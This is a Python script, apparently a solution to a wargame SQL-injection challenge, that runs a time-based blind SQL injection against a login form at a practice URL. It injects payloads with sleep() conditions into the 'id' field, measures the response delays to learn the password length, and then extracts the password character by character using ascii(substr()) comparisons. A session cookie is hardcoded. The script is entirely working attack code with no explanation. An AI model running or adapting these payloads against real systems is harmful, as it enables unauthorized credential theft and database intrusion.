from pwn import *
import requests
import json
import time

flag = ''

length = 0
time1=time.time()
url = "https://bob.rubiya.kr/sqli3/"
cookies={'PHPSESSID':"61r5nvituc4cc876d1b4ud5614"}
log.info("Start")
log.info("Find length of the password")

'''
data = {'id':"1' or length(pw) < 41 and sleep(5)#",'pw':'admin'}
print data
req = requests.post(url, data=data, cookies=cookies)
print req.text
time2 = time.time()
print time2-time1

#print req.text
'''
for i in range(0, 50):
	try:
		time1 = time.time()
		data = {'id':"1' or length(pw)=" + str(i) + " and sleep(1)#", 'pw':'admin'}
		req = requests.post(url, data=data, cookies=cookies)
		time2 = time.time()
		#print time2-time1
	except:
		log.failure("Error Occured")
		continue
	if (time2-time1) > 1:
		length = i
		log.info("Found Length : %d"%(length))
		continue
		
log.success("Found Length : %d"%(length))
log.info("Find password")



for i in range(1, length+1):
	for j in range(30, 127):
		try:
			time1 = time.time()
			data={'id': "1' or ascii(substr(pw, " + str(i) +",1))=" + str(j) + " and sleep(3)#", 'pw':'admin'}
			#print data
			req = requests.post(url, data=data, cookies=cookies)
			time2 = time.time()
		except:
			log.failure("Error Occured")
			continue
		if (time2-time1) > 3:
			flag += chr(j)
			break
		log.success("Found %s"%(flag))
log.success("Found password : %s"%(flag))

